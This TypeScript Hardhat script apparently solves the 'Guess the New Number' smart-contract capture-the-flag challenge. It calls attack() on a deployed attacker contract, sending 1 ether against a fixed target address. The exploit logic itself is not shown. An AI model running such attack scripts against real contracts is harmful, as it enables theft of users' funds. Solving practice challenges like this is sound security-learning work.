import { utils, PayableOverrides } from 'ethers';
import { ethers } from 'hardhat';
import { handleError, getWallet } from '../../utils';

const CONTRACT_ADDRESS = '0x739ba08A85A3F3565D946dF5f7daFA7cadE5d679';

const main = async () => {
  const wallet = getWallet();

  const attacker = await ethers.getContractAt(
    'GuessTheNewNumberAttacker',
    '0xf49369481cDF60222C2DFbcda149C1f7c60768b6',
    wallet
  );

  const overrides: PayableOverrides = {
    value: utils.parseEther('1'),
    gasLimit: '100000',
  };

  const result = await attacker.attack(overrides);

  console.log(result);
};

main().catch(handleError);
